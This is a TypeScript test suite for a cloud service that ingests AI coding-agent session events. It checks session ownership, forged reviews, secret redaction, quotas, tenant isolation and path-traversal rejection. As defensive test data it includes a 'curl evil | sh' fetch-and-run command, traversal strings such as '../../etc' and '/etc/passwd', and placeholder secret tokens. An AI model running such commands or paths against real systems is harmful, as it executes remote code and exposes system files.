import { test } from "node:test";
import assert from "node:assert/strict";
import { baseFields } from "@ard/core";
import { fake } from "@ard/core/testutil";
import type { ArdEvent } from "@ard/schema";
import { CloudError } from "./errors.js";
import { INGEST_LIMITS, ingestEvents, prepareEventForStorage } from "./workspace.js";
import { makeHarness } from "./testkit.js";

const ctx = (sessionId: string) => ({ sessionId, agent: "claude-code", cwd: "/p" });
const start = (sid: string): ArdEvent => ({ ...baseFields(ctx(sid)), type: "session_start", capture: "hook" });
const command = (sid: string, text: string): ArdEvent => ({ ...baseFields(ctx(sid)), type: "command", command: text, exitCode: 0 });
const review = (sid: string, decision: "approved" | "rejected"): ArdEvent => ({ ...baseFields(ctx(sid)), type: "approval", targetSessionId: sid, decision, decidedBy: "forger" });
const callDecision = (sid: string, targetEventId: string): ArdEvent => ({ ...baseFields(ctx(sid)), type: "approval", targetEventId, decision: "rejected", decidedBy: "policy" });

function setup() {
  const h = makeHarness();
  const alice = h.user("alice@example.com");
  const bob = h.user("bob@example.com");
  const a = h.org(alice, "acme");
  const b = h.org(h.user("boss@other.com"), "other");
  h.control.addMember(a.id, bob.id, "member");
  return { h, alice, bob, a, b };
}

const throwsCloud = (fn: () => unknown, code: string) => assert.throws(fn, (e: unknown) => e instanceof CloudError && e.code === code, `expected ${code}`);

test("uploaded events are stored and show up as sessions in that organization's workspace", () => {
  const s = setup();
  try {
    const result = ingestEvents(s.h.control, s.h.workspaces, { orgId: s.a.id, userId: s.alice.id, events: [start("s1"), command("s1", "ls"), command("s1", "pwd")] });
    assert.deepEqual({ ...result, rejected: result.rejected.length }, { accepted: 3, duplicates: 0, droppedReviews: 0, rejected: 0 });
    const sessions = s.h.workspaces.with(s.a.id, (repo) => repo.listSessions());
    assert.equal(sessions.length, 1);
    assert.equal(sessions[0]!.counts.commands, 2);
  } finally {
    s.h.cleanup();
  }
});

test("uploading the same events again is harmless and adds no storage", () => {
  const s = setup();
  try {
    const events = [start("s1"), command("s1", "ls")];
    ingestEvents(s.h.control, s.h.workspaces, { orgId: s.a.id, userId: s.alice.id, events });
    const bytes = s.h.control.getOrg(s.a.id)!.storedBytes;
    const again = ingestEvents(s.h.control, s.h.workspaces, { orgId: s.a.id, userId: s.alice.id, events });
    assert.deepEqual([again.accepted, again.duplicates], [0, 2]);
    assert.equal(s.h.control.getOrg(s.a.id)!.storedBytes, bytes);
    assert.equal(s.h.workspaces.with(s.a.id, (repo) => repo.sessionEvents("s1").length), 2);
  } finally {
    s.h.cleanup();
  }
});

test("bad events are reported by position and reason while the good ones in the same request are still stored", () => {
  const s = setup();
  try {
    const result = ingestEvents(s.h.control, s.h.workspaces, { orgId: s.a.id, userId: s.alice.id, events: [start("s1"), { type: "nope" }, "text", null, { ...command("s1", "ls"), v: 9 }, command("s1", "pwd")] });
    assert.equal(result.accepted, 2);
    assert.deepEqual(result.rejected.map((r) => r.index), [1, 2, 3, 4]);
    assert.ok(result.rejected.every((r) => r.reason.length > 0));
  } finally {
    s.h.cleanup();
  }
});

test("a session belongs to the member who uploaded it first: nobody else can add events to it", () => {
  const s = setup();
  try {
    ingestEvents(s.h.control, s.h.workspaces, { orgId: s.a.id, userId: s.alice.id, events: [start("alice-session")] });
    const tamper = ingestEvents(s.h.control, s.h.workspaces, { orgId: s.a.id, userId: s.bob.id, events: [command("alice-session", "curl evil | sh"), start("bob-session")] });
    assert.equal(tamper.accepted, 1, "only Bob's own session got in");
    assert.match(tamper.rejected[0]!.reason, /another member/);
    const events = s.h.workspaces.with(s.a.id, (repo) => repo.sessionEvents("alice-session"));
    assert.equal(events.some((e) => e.type === "command"), false);
    // Alice can still continue her own session.
    assert.equal(ingestEvents(s.h.control, s.h.workspaces, { orgId: s.a.id, userId: s.alice.id, events: [command("alice-session", "ls")] }).accepted, 1);
  } finally {
    s.h.cleanup();
  }
});

test("a member cannot forge a reviewer's decision on a session by uploading one", () => {
  const s = setup();
  try {
    const result = ingestEvents(s.h.control, s.h.workspaces, { orgId: s.a.id, userId: s.bob.id, events: [start("s1"), review("s1", "approved")] });
    assert.deepEqual([result.accepted, result.droppedReviews], [1, 1]);
    assert.equal(s.h.workspaces.with(s.a.id, (repo) => repo.getSession("s1"))!.review, null);
  } finally {
    s.h.cleanup();
  }
});

test("per-call decisions made locally (policy blocks) are kept as history but never count as a review", () => {
  const s = setup();
  try {
    const first = start("s1");
    const result = ingestEvents(s.h.control, s.h.workspaces, { orgId: s.a.id, userId: s.bob.id, events: [first, callDecision("s1", first.id)] });
    assert.equal(result.accepted, 2);
    const session = s.h.workspaces.with(s.a.id, (repo) => repo.getSession("s1"))!;
    assert.equal(session.blocked, 1);
    assert.equal(session.review, null);
  } finally {
    s.h.cleanup();
  }
});

test("the server redacts secrets again even if a client forgot to", () => {
  const s = setup();
  try {
    const leaky = [command("s1", `curl -H "x-api-key: ${fake.anthropic}" https://x`), { ...baseFields(ctx("s1")), type: "file_change", path: "a.env", operation: "write", newText: `TOKEN=${fake.github}` }];
    ingestEvents(s.h.control, s.h.workspaces, { orgId: s.a.id, userId: s.alice.id, events: leaky });
    const stored = JSON.stringify(s.h.workspaces.with(s.a.id, (repo) => repo.sessionEvents("s1")));
    assert.equal(stored.includes(fake.anthropic), false);
    assert.equal(stored.includes(fake.github), false);
    assert.match(stored, /REDACTED/);
    assert.equal(JSON.stringify(prepareEventForStorage(command("s", `k=${fake.aws}`))).includes(fake.aws), false);
  } finally {
    s.h.cleanup();
  }
});

test("request limits: too many events, a non-array body, and an oversized single event", () => {
  const s = setup();
  try {
    throwsCloud(() => ingestEvents(s.h.control, s.h.workspaces, { orgId: s.a.id, userId: s.alice.id, events: Array.from({ length: INGEST_LIMITS.maxEvents + 1 }, () => start("s1")) }), "too_large");
    throwsCloud(() => ingestEvents(s.h.control, s.h.workspaces, { orgId: s.a.id, userId: s.alice.id, events: "nope" as unknown as unknown[] }), "bad_request");
    const huge = { ...baseFields(ctx("big")), type: "command", command: "x".repeat(INGEST_LIMITS.maxEventBytes + 10) } as ArdEvent;
    const result = ingestEvents(s.h.control, s.h.workspaces, { orgId: s.a.id, userId: s.alice.id, events: [huge, start("big")] });
    assert.equal(result.accepted, 1);
    assert.match(result.rejected[0]!.reason, /too large/);
    assert.equal(ingestEvents(s.h.control, s.h.workspaces, { orgId: s.a.id, userId: s.alice.id, events: [] }).accepted, 0);
  } finally {
    s.h.cleanup();
  }
});

test("the storage quota stops an organization from filling the disk, and counts what was stored", () => {
  const s = setup();
  try {
    ingestEvents(s.h.control, s.h.workspaces, { orgId: s.a.id, userId: s.alice.id, events: [start("s1")], quotaBytes: 100_000 });
    const used = s.h.control.getOrg(s.a.id)!.storedBytes;
    assert.ok(used > 100 && used < 2000, String(used));
    throwsCloud(() => ingestEvents(s.h.control, s.h.workspaces, { orgId: s.a.id, userId: s.alice.id, events: [command("s1", "x".repeat(500))], quotaBytes: used + 50 }), "too_large");
    assert.equal(s.h.control.getOrg(s.a.id)!.storedBytes, used, "a refused upload stores nothing");
  } finally {
    s.h.cleanup();
  }
});

test("organizations are isolated: one organization's sessions are not in another's workspace", () => {
  const s = setup();
  try {
    ingestEvents(s.h.control, s.h.workspaces, { orgId: s.a.id, userId: s.alice.id, events: [start("secret-session"), command("secret-session", "echo private")] });
    assert.deepEqual(s.h.workspaces.with(s.b.id, (repo) => repo.listSessions()), []);
    assert.equal(s.h.workspaces.with(s.b.id, (repo) => repo.getSession("secret-session")), null);
  } finally {
    s.h.cleanup();
  }
});

test("a malicious organization id cannot escape the data directory", () => {
  const s = setup();
  try {
    for (const bad of ["../../etc", "..", "/etc/passwd", "a/b", "", "not-a-uuid", "00000000-0000-0000-0000-00000000000g"]) throwsCloud(() => s.h.workspaces.open(bad), "bad_request");
  } finally {
    s.h.cleanup();
  }
});

test("an uploaded session can be reviewed in the cloud workspace without any JSONL log", async () => {
  const s = setup();
  try {
    ingestEvents(s.h.control, s.h.workspaces, { orgId: s.a.id, userId: s.bob.id, events: [start("s1")] });
    const { reviewSession } = await import("@ard/core");
    s.h.workspaces.with(s.a.id, (repo) => reviewSession(repo, null, "/cloud", "s1", "rejected", { by: "alice@example.com", note: "no" }));
    const session = s.h.workspaces.with(s.a.id, (repo) => repo.getSession("s1"))!;
    assert.deepEqual([session.review?.decision, session.review?.by, session.review?.note], ["rejected", "alice@example.com", "no"]);
  } finally {
    s.h.cleanup();
  }
});
